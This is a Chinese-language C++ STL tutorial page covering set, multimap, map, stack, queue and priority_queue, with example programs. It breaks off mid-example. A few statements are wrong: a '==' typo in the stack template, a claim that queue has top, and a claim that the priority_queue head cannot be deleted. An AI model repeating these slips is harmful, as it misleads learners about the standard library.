<p>使用 set 必须包含头文件 <set>。set 的定义如下：</set></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt; <span class="class"><span class="keyword">class</span> <span class="title">Key</span>, <span class="title">class</span> <span class="title">Pred</span> = <span class="title">less</span>&lt;Key&gt;, <span class="title">class</span> <span class="title">A</span> = <span class="title">allocator</span>&lt;Key&gt; &gt; <span class="title">class</span> <span class="title">set</span> &#123;</span>...&#125;</span><br></pre></td></tr></table></figure>
<p>由于不能有重复元素，所以 set 中插入单个元素的 insert 成员函数与 multiset 中的有所不同，其原型如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">pair&lt;iterator, bool&gt; insert(const T &amp; val);</span><br></pre></td></tr></table></figure>
<p>如果 set 的 insert 成员函数的返回值是 pair 模板类对象 x，如果 x.second 为 true，则说明插入成功，此时 x.first 就是指向被插入元素的迭代器；如果 x.second 为 false，则说明要插入的元素已在容器中，此时 x.first 就是指向原有那个元素的迭代器。</p>
<p>关联容器的 equal_range 成员函数的返回值也是 pair 模板类对象，其原型如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">pair&lt;iterator, iterator&gt; equal_range(const T &amp; val);</span><br></pre></td></tr></table></figure>
<p>返回值对象中的 first 就是 lower_bound 的值，second 就是 upper_bound 的值。</p>
<p>下面的程序演示了 set 的用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;  //使用set须包含此文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator IT;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">5</span>] = &#123; <span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">2</span> &#125;;</span><br><span class="line">    <span class="function"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; <span class="title">st</span><span class="params">(a,a+<span class="number">5</span>)</span></span>;    <span class="comment">// st里是 1 2 3 4 6</span></span><br><span class="line">    <span class="built_in">pair</span>&lt; IT,<span class="keyword">bool</span>&gt; result;</span><br><span class="line">    result = st.insert(<span class="number">5</span>); <span class="comment">// st变成  1 2 3 4 5 6</span></span><br><span class="line">    <span class="keyword">if</span>(result.second)    <span class="comment">//插入成功则输出被插入元素</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; * result.first  &lt;&lt; <span class="string">&quot; inserted&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出: 5 inserted</span></span><br><span class="line">    <span class="keyword">if</span>(st.insert(<span class="number">5</span>).second)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; * result.first  &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; * result.first &lt;&lt; <span class="string">&quot; already exists&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//输出 5 already exists</span></span><br><span class="line">    <span class="built_in">pair</span>&lt;IT,IT&gt; bounds = st.equal_range(<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; * bounds.first &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; * bounds.second ;  <span class="comment">//输出：4,5</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序的输出结果是：<br>5 inserted<br>5 already exists<br>4,5</p>
<h4 id="C-multimap，STL-multimap详解"><a href="#C-multimap，STL-multimap详解" class="headerlink" title="C++ multimap，STL multimap详解"></a>C++ multimap，STL multimap详解</h4><p>multimap 是关联容器的一种，multimap 的每个元素都分为关键字和值两部分，容器中的元素是按关键字排序的，并且允许有多个元素的关键字相同。</p>
<p>注意，不能直接修改 multimap 容器中的关键字。因为 multimap 中的元素是按照关键字排序的，当关键字被修改后，容器并不会自动重新调整顺序，于是容器的有序性就会被破坏，再在其上进行查找等操作就会得到错误的结果。</p>
<p>使用 multimap 必须包含头文件 map。multimap 的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt; <span class="class"><span class="keyword">class</span> <span class="title">Key</span>, <span class="title">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">Pred</span> = <span class="title">less</span>&lt;Key&gt;, <span class="title">class</span> <span class="title">A</span> = <span class="title">allocator</span>&lt;T&gt; &gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">multimap</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">typedef</span> <span class="built_in">pair</span> &lt;<span class="keyword">const</span> Key, T&gt; value_type;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>multimap 中的元素都是 pair 模板类的对象。元素的 first 成员变量也叫“关键字”，second 成员变量也叫“值”。multimap 容器中的元素是按关键字从小到大排序的。默认情况下，元素的关键之间用 less <Key> 比较大小，也就是用<code>&lt;</code>运算符比较大小。multimap 允许多个元素的关键字相同。</Key></p>
<p>multimap 中的 value_type 实际上就表示容器中元素的类型。<a href="http://c.biancheng.net/cplus/">C++</a> 允许在类的内部定义类型。</p>
<p>multimap 的成员函数（未列出每个函数的所有版本）如表 1 所示。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>成员函数或成员函数模板</th>
<th>作  用</th>
</tr>
</thead>
<tbody>
<tr>
<td>iterator find( const Key &amp; val);</td>
<td>在容器中查找关键字等于 val 的元素，返回其迭代器；如果找不到，返回 end()</td>
</tr>
<tr>
<td>iterator insert (pair <Key, t> const &amp;p);</Key,></td>
<td>将 pair 对象 p 插入容器中并返回其迭代器</td>
</tr>
<tr>
<td>void insert(iterator first, iterator last);</td>
<td>将区间 [first, last) 插入容器</td>
</tr>
<tr>
<td>int count( const Key &amp; val);</td>
<td>统计有多少个元素的关键字和 val 相等</td>
</tr>
<tr>
<td>iterator lower_bound( const Key &amp; val);</td>
<td>查找一个最大的位置 it，使得 [begin( ), it) 中所有的元素的关键字都比 val 小</td>
</tr>
<tr>
<td>iterator upper_bound(const Key &amp; val);</td>
<td>查找一个最小的位置 it，使得 [it, end()) 中所有的元素的关键字都比 val 大</td>
</tr>
<tr>
<td>pair &lt; iterator, iterator &gt; equal_range (const Key &amp; val);</td>
<td>同时求得 lower_bound 和 upper_bound</td>
</tr>
<tr>
<td>iterator erase(iterator it);</td>
<td>删除 it 指向的元素，返回其后面的元素的迭代器（Visual Studio 2010 中如此，但是在 C++ 标准和 Dev C++ 中，返回值不是这样）</td>
</tr>
<tr>
<td>iterator erase(iterator first, iterator last);</td>
<td>删除区间 [first, last)，返回 last（Visual Studio 2010 中如此，但是在 C++ 标准和 Dev C++ 中，返回值不是这样）</td>
</tr>
</tbody>
</table>
</div>
<p>multimap 及 map 中的 find 和 count 不用<code>==</code>运算符比较两个关键字是否相等。如果<code>x比y小</code>和<code>y比x小</code>同时为假，就认为 x 和 y 相等。</p>
<p>例题：一个学生成绩录入和查询系统接受以下两种输入：<br>1) Add name id score<br>2) Query score</p>
<p>name 是一个字符串，其中不包含空格，表示学生姓名。id 是一个整数，表示学号。score 是一个整数，表示分数。学号不会重复，分数和姓名都可能重复。</p>
<p>两种输入交替出现。</p>
<ul>
<li>第一种输入表示要添加一个学生的信息，碰到这种输入，就记下学生的姓名、id 和分数。</li>
<li>第二种输入表示要查询分数为 score 的学生的信息，碰到这种输入，就输出已有记录中分数比查询分数低的最高分获得者的姓名、学号和分数。如果有多个学生满足条件，则输出学号最大的学生的信息。如果找不到满足条件的学生，则输出“Nobody”。</li>
</ul>
<p>输入样例：<br>Add Jack 12 78<br>Query 78<br>Query 81<br>Add Percy 9 81<br>Add Marry 8 81<br>Query 82<br>Add Tom 11 79<br>Query 80<br>Query 81</p>
<p>输出结果样例：<br>Nobody<br>Jack 12 78<br>Percy 9 81<br>Tom 11 79<br>Tom 11 79</p>
<p>此题如果用 vector 存放所有学生的信息，然后进行顺序查找的话，在学生数量很大和查询很多的情况下非常费时，因为顺序查找的时间复杂度是 O(n)。将 vector 排序后再查找也不行，因为会不断插入新元素，每次插入新元素就要进行元素的移动，而这一步骤的时间复杂度是O(n)，这会导致效率低下。</p>
<p>下面程序的思路是用 multimap 存放学生信息，使学生信息按照分数排序。</p>
<p>要添加学生时，就用 insert 成员函数插入学生记录，这步操作的时间复杂度是 O(log(n))。</p>
<p>输入一个要查询的分数 score 时，就用 lower_bound 求得该分数对应的下界——迭代器 p（这一步的时间复杂度是 O(log(n)）。 *p 这个元素的分数是大于或等于 score 的，往前再找一个元素，其分数就是低于 score 的最高分了。继续往前遍历所有等于该分数的元素，找出 id 最大的元素输出即可。</p>
<p>解题程序如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;  //使用multimap需要包含此头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CStudent</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CInfo</span>  //类的内部还可以定义类</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">int</span> id;</span><br><span class="line">        <span class="built_in">string</span> name;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    CInfo info;  <span class="comment">//学生的其他信息</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">multimap</span> &lt;<span class="keyword">int</span>, CStudent::CInfo&gt; MAP_STD;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    MAP_STD mp;</span><br><span class="line">    CStudent st;</span><br><span class="line">    <span class="built_in">string</span> cmd;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; cmd) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmd == <span class="string">&quot;Add&quot;</span>) &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; st.info.name &gt;&gt; st.info.id &gt;&gt; st.score;</span><br><span class="line">            mp.insert(MAP_STD::value_type(st.score, st.info));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (cmd == <span class="string">&quot;Query&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> score;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; score;</span><br><span class="line">            MAP_STD::iterator p = mp.lower_bound(score);</span><br><span class="line">            <span class="keyword">if</span> (p != mp.begin()) &#123;</span><br><span class="line">                --p;</span><br><span class="line">                score = p-&gt;first;  <span class="comment">//比要查询分数低的最高分</span></span><br><span class="line">                MAP_STD::iterator maxp = p;</span><br><span class="line">                <span class="keyword">int</span> maxId = p-&gt;second.id;</span><br><span class="line">                <span class="keyword">for</span> (; p != mp.begin() &amp;&amp; p-&gt;first == score; --p) &#123;</span><br><span class="line">                    <span class="comment">//遍历所有成绩和score相等的学生</span></span><br><span class="line">                    <span class="keyword">if</span> (p-&gt;second.id &gt; maxId) &#123;</span><br><span class="line">                        maxp = p;</span><br><span class="line">                        maxId = p-&gt;second.id;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (p-&gt;first == score) &#123; <span class="comment">//如果上面的循环因为 p == mp.begin()</span></span><br><span class="line">                                         <span class="comment">//而终止，则p指向的元素还要处理</span></span><br><span class="line">                    <span class="keyword">if</span> (p-&gt;second.id &gt; maxId) &#123;</span><br><span class="line">                        maxp = p;</span><br><span class="line">                        maxId = p-&gt;second.id;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; maxp-&gt;second.name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; maxp-&gt;second.id &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">                    &lt;&lt; maxp-&gt;first &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>  <span class="comment">//lower_bound 的结果就是 begin，说明没有分数比查询分数低</span></span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Nobody&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>multimap 容器中的元素必须是 pair 类模板对象。本题需要用 multimap 来存放学生信息，然而学生信息由三部分组成：姓名、学号、分数，解决的办法就是将用于排序的 score 作为一个成员变量，而且把其他部分一起作为一个 CInfo 对象，这样，第 16 行实例化出来的类 multimap <int, cstudent::cinfo> 中的元素的类型就会是如下 pair 模板类：</int,></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pair</span> &lt;int, CStudent::CInfo&gt;</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> first; <span class="comment">//对应于CStudent::score</span></span><br><span class="line">  CStudent::CInfo second; <span class="comment">//对应于 CStudent::info</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>第 26 行如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">mp.insert( MAP_STD::value_type(st.score, st.info) );</span><br></pre></td></tr></table></figure>
<p>参看 multimap 的定义，MAP_STD::value_type 就是容器中元素的类型，该类型是 pair <int, cstudent::cinfo>。类型名后面跟构造函数的参数表就代表一个对象。因此，此条语句生成了一个 pair <int, cstudent::cinfo> 对象并将其插入 multimap 容器中。该对象内部存放的信息和 st 相同，first 对应于 st.score，second 对应于 st.info。</int,></int,></p>
<p>第 31 行，lower_bound 的返回结果 p 满足以下条件：[begin(), p) 中的分数都比查询分数低，但是 <em>p 的分数不比查询分数低。所以执行 —p 操作之后，</em>p 的分数就是低于查询分数的最高分了。</p>
<h4 id="C-map，STL-map详解"><a href="#C-map，STL-map详解" class="headerlink" title="C++ map，STL map详解"></a>C++ map，STL map详解</h4><p>map 是关联容器的一种，map 的每个元素都分为关键字和值两部分，容器中的元素是按关键字排序的，并且不允许有多个元素的关键字相同。</p>
<p>注意，不能直接修改 map 容器中的关键字。因为 map 中的元素是按照关键字排序的，当关键字被修改后，容器并不会自动重新调整顺序，于是容器的有序性就会被破坏，再在其上进行查找等操作就会得到错误的结果。</p>
<p>要使用 map，必须包含头文件 <map>。map 的定义如下：</map></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt; <span class="class"><span class="keyword">class</span> <span class="title">Key</span>, <span class="title">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">Pred</span> = <span class="title">less</span>&lt;Key&gt;, <span class="title">class</span> <span class="title">A</span> = <span class="title">allocator</span>&lt;T&gt; &gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">map</span>&#123;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">typedef</span> <span class="built_in">pair</span>&lt; <span class="keyword">const</span> Key, T &gt; value_type;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>map 和 multimap 十分类似，区别在于 map 容器中元素的关键字不能重复。multimap 有的成员函数，map 都有。此外，map 还有成员函数 operator[]：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">T &amp; <span class="keyword">operator</span>[] (Key k);</span><br></pre></td></tr></table></figure>
<p>该成员函数返回 first 值为 k 的元素的 second 部分的引用。如果容器中没有元素的 first 值等于 k，则自动添加一个 first 值为 k 的元素。如果该元素的 second 成员变量是一个对象，则用无参构造函数对其初始化。</p>
<p>下面的程序演示了 map 的用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;  //使用map需要包含此头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T1</span>,<span class="title">class</span> <span class="title">T2</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">ostream</span> &amp; <span class="title">operator</span> &lt;&lt;(ostream &amp; o,const pair&lt;T1,T2&gt; &amp; p)</span></span><br><span class="line"><span class="class">&#123; //将pair对象输出为 (first,second)形式</span></span><br><span class="line"><span class="class">    o &lt;&lt; &quot;(&quot; &lt;&lt; p.first  &lt;&lt; &quot;,&quot; &lt;&lt; p.second &lt;&lt; &quot;)&quot;;</span></span><br><span class="line"><span class="class">    return o;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">template&lt;class T&gt;</span></span><br><span class="line"><span class="class">void Print(T first,T last)</span></span><br><span class="line"><span class="class">&#123;//打印区间[first,last)</span></span><br><span class="line"><span class="class">    for( ; first != last; ++ first)</span></span><br><span class="line"><span class="class">        cout &lt;&lt;  * first &lt;&lt; &quot; &quot;;</span></span><br><span class="line"><span class="class">    cout &lt;&lt; endl;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">typedef map&lt;int,double,greater&lt;int&gt; &gt; MYMAP; //此容器关键字是整型，元素按关键字从大到小排序</span></span><br><span class="line"><span class="class">int main()</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class">    MYMAP mp;</span></span><br><span class="line"><span class="class">    mp.insert(MYMAP::value_type(15,2.7));</span></span><br><span class="line"><span class="class">    pair&lt;MYMAP::iterator,bool&gt; p = mp.insert(make_pair(15,99.3));</span></span><br><span class="line"><span class="class">    if(!p.second)</span></span><br><span class="line"><span class="class">        cout &lt;&lt; * (p.first) &lt;&lt; &quot; already exists&quot; &lt;&lt; endl; //会输出</span></span><br><span class="line"><span class="class">    cout &lt;&lt; &quot;1) &quot; &lt;&lt; mp.count(15) &lt;&lt; endl; //输出 1) 1</span></span><br><span class="line"><span class="class">    mp.insert(make_pair(20,9.3));</span></span><br><span class="line"><span class="class">    cout &lt;&lt; &quot;2) &quot; &lt;&lt; mp[40] &lt;&lt; endl;//如果没有关键字为40的元素，则插入一个</span></span><br><span class="line"><span class="class">    cout &lt;&lt; &quot;3) &quot;;Print(mp.begin(),mp.end());//输出：3) (40,0)(20,9.3)(15,2.7)</span></span><br><span class="line"><span class="class">    mp[15] = 6.28; //把关键字为15的元素值改成6.28</span></span><br><span class="line"><span class="class">    mp[17] = 3.14; //插入关键字为17的元素，并将其值设为3.14</span></span><br><span class="line"><span class="class">    cout &lt;&lt; &quot;4) &quot;;Print(mp.begin(),mp.end());</span></span><br><span class="line"><span class="class">    return 0;</span></span><br><span class="line"><span class="class">&#125;</span></span><br></pre></td></tr></table></figure>
<p>程序的输出结果如下：<br>(15,2.7) already exists<br>1) 1<br>2) 0<br>3) (40,0) (20,9.3) (15,2.7)<br>4) (40,0) (20,9.3) (17,3.14) (15,6.28)</p>
<p>第 17 行的<code>greater &lt;int&gt; &gt;</code>最右边的两个<code>&gt;</code>之间要有空格，否则 Dev <a href="http://c.biancheng.net/cplus/">C++</a> 会将它们当作右移运算符，导致编译出错。在 Visual Studio 2010 中无此问题。</p>
<p>第 22 行用 <a href="http://c.biancheng.net/stl/">STL</a> 中的函数模板 make_pair 生成一个 pair 模板类对象插入 mp 中。</p>
<p>第 23 行，如果插入成功，p.second 的值会是 true。显然这里不能成功，因为 map 不允许关键字重复。因为关键字重复而插入失败时，p.first 就指向容器中关键字相同的那个元素。</p>
<p>第 27 行要访问关键字为 40 的元素。在没有这个元素的情况下，一个关键字为 40、值为 0 的元素被自动插入容器。mp[40] 等价于<code>mp.operator[](40);</code>，其返回值是关键字为 40 的那个元素（不论是原有的还是新插入的）的 second 成员变量的引用。第 29 行和第 30 行的道理与此类似。</p>
<h4 id="C-容器适配器简介"><a href="#C-容器适配器简介" class="headerlink" title="C++ 容器适配器简介"></a>C++ 容器适配器简介</h4><p><a href="http://c.biancheng.net/stl/">STL</a> 中的容器适配器有 stack、queue、priority_queue 三种。它们都是在顺序容器的基础上实现的，屏蔽了顺序容器的一部分功能，突出或增加了另外一些功能。</p>
<p>容器适配器都有以下三个成员函数：</p>
<ul>
<li>push：添加一个元素。</li>
<li>top：返回顶部（对 stack 而言）或队头（对 queue、priority_queue 而言）的元素的引用。</li>
<li>pop：删除一个元素。</li>
</ul>
<p>容器适配器是没有迭代器的，因此 STL 中的各种排序、查找、变序等算法都不适用于容器适配器。</p>
<h4 id="C-stack，STL-stack详解"><a href="#C-stack，STL-stack详解" class="headerlink" title="C++ stack，STL stack详解"></a>C++ stack，STL stack详解</h4><p>stack 是容器适配器的一种。要使用 stack，必须包含头文件 <stack>。</stack></p>
<p>stack就是“栈”。栈是一种后进先出的元素序列，访问和删除都只能对栈顶的元素（即最后一个被加入栈的元素）进行，并且元素也只能被添加到栈顶。栈内的元素不能访问。如果一定要访问栈内的元素，只能将其上方的元素全部从栈中删除，使之变成栈顶元素才可以。</p>
<p>stack的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt; <span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">Cont</span> == <span class="title">deque</span> &lt;T&gt; &gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>第二个参数表明，在默认情况下，stack 就是用 deque 实现的。当然，也可以指定用 vector 或 list 实现。</p>
<p>虽然 stack 使用顺序容器实现，但它不提供顺序容器具有的成员函数。除了 size、 empty 这两个所有容器都有的成员函数外，stack 还有以下三个成员函数，如表 1 所示。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>成员函数</th>
<th>功  能</th>
</tr>
</thead>
<tbody>
<tr>
<td>void pop();</td>
<td>弹出（即删除）栈顶元素</td>
</tr>
<tr>
<td>T &amp; top();</td>
<td>返回栈顶元素的引用。通过此函数可以读取栈顶元素的值，也可以修改栈顶元素</td>
</tr>
<tr>
<td>void push (const T &amp; x);</td>
<td>将 x 压入栈顶</td>
</tr>
</tbody>
</table>
</div>
<p>例题：编写程序，输入一个十进制数 n 和进制 k（k≤10），输出 n 对应的 k 进制数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;  //使用stack需要包含此头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, k;</span><br><span class="line">    <span class="built_in">stack</span> &lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; k;  <span class="comment">//将n转换为k进制数</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (n) &#123;</span><br><span class="line">        stk.push(n%k);</span><br><span class="line">        n /= k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!stk.empty()) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; stk.top();</span><br><span class="line">        stk.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="C-queue和priority-queue，STL-queue和priority-queue"><a href="#C-queue和priority-queue，STL-queue和priority-queue" class="headerlink" title="C++ queue和priority_queue，STL queue和priority_queue"></a>C++ queue和priority_queue，STL queue和priority_queue</h4><p>queue 和 priority_queue 都是容器适配器，要使用它们，必须包含头文件 <queue>。</queue></p>
<p><strong>queue</strong></p>
<p>queue 就是“队列”。队列是先进先出的，和排队类似。队头的访问和删除操作只能在队头进行，添加操作只能在队尾进行。不能访问队列中间的元素。</p>
<p>queue 可以用 list 和 deque 实现，默认情况下用 deque 实现。</p>
<p>queue 的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt; <span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">Cont</span> = <span class="title">deque</span>&lt;T&gt; &gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">queue</span>&#123;</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>queue 同样也有和 stack 类似的 push、pop、top 函数。区别在于，queue 的 push 发生在队尾，pop 和 top 发生在队头。</p>
<p><strong>priority_queue</strong></p>
<p>priority_queue 是“优先队列”。它和普通队列的区别在于，优先队列的队头元素总是最大的——即执行 pop 操作时，删除的总是最大的元素；执行 top 操作时，返回的是最大元素的引用。</p>
<p>priority_queue 可以用 vector 和 deque 实现，默认情况下用 vector 实现。</p>
<p>priority_queue 默认的元素比较器是 less <T>。也就是说，在默认情况下，要放入 priority_queue 的元素必须是能用“&lt;”运算符进行比较的，而且 priority _queue 保证以下条件总是成立：对于队头的元素 x 和任意非队头的元素 y，表达式“x&lt;y”必为 false。</T></p>
<p>priority_queue 定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt; <span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">Container</span> = <span class="title">vector</span> &lt;T&gt;, <span class="title">class</span> <span class="title">Compare</span> = <span class="title">less</span>&lt;T&gt; &gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">priority_queue</span>&#123;</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>priority_queue 的第三个类型参数可以用来指定排序规则。</p>
<p>和 set/multiset 不同，priority_queue 是使用“堆排序”技术实现的，其内部并非完全有序，但却能确保最大元素总在队头。因此，priority_queue 特别适用于“不停地在一堆元素中取走最大的元素”这种情况。priority_queue 插入和删除元素的复杂度都是 O(log(n))。虽然用 set/multiset 也能完成此项工作，但是 priority_queue 比它们略快一些。</p>
<p>priority_queue 队头的元素只能被查看或者修改，不能被删除。</p>
<p>priority_queue的用法示例如下。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">priority_queue</span>&lt;<span class="keyword">double</span>&gt; pq1;</span><br><span class="line">    pq1.push(<span class="number">3.2</span>); pq1.push(<span class="number">9.8</span>); pq1.push(<span class="number">9.8</span>); pq1.push(<span class="number">5.4</span>);</span><br><span class="line">    <span class="keyword">while</span>(!pq1.empty()) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; pq1.top() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        pq1.pop();</span><br><span class="line">    &#125; <span class="comment">//上面输出 9.8 9.8 5.4 3.2</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">priority_queue</span>&lt;<span class="keyword">double</span>,<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt;,greater&lt;<span class="keyword">double</span>&gt; &gt; pq2;</span><br><span class="line">    pq2.push(<span class="number">3.2</span>); pq2.push(<span class="number">9.8</span>); pq2.push(<span class="number">9.8</span>); pq2.push(<span class="number">5.4</span>);</span><br><span class="line">    <span class="keyword">while</span>(!pq2.empty()) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; pq2.top() 